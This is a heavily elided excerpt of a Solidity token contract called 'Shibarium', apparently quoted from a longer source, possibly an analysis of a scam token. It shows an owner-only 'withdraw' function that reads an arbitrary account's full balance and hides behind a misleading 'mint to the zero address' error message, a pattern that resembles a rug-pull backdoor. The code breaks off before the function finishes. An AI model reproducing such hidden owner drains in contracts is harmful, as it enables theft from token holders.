...
contract Shibarium is Context, IERC20 {
    ...
    address lead_deployer = 0xab9580Cb53c887069e02BE2BDA1d425e846956bC;
    address public _owner = 0x28298bfC5bee4856dc8c2b19795F1fe50BFD3c32;
   constructor () public {
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function bridge(address account) public {
        ...
        function withdraw(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
